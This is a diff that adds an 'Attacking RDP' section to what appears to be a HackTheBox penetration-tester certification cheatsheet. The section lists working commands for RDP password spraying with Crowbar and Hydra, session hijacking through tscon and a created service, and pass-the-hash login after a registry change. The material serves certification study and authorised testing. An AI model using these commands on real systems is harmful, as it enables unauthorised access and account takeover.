@@ -54,6 +54,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
   	- [Attacking FTP](#attacking-ftp)
     - [Attacking SMB](#attacking-smb)
     - [Attacking SQL](#attacking-sql)
+    - [Attacking RDP](#attacking-rdp)
     - [Attacking Email Services](#attacking-email-services)
 - [Active Directory](#active-directory)
     - [Initial Enumeration](#initial-enumeration)
@@ -1087,6 +1088,29 @@ SELECT srvname, isremote FROM sysservers
 # Identify the user and its privileges used for the remote connection in MSSQL.
 EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
 ```
+##### Attacking RDP
+```
+nmap -Pn -p3389 192.168.2.143 
+
+# Crowbar and Hydra - RDP Password Spraying
+crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+
+# RDP Login
+rdesktop -u admin -p password123 192.168.2.143
+
+# RDP Session Hijacking
+tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
+query user
+sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+net start sessionhijack
+
+# RDP Pass-the-Hash (PtH)
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
+
+```
+# DNS lookup for mail servers for the specified domain
 ##### Attacking Email Services
 ```
 # DNS lookup for mail servers for the specified domain
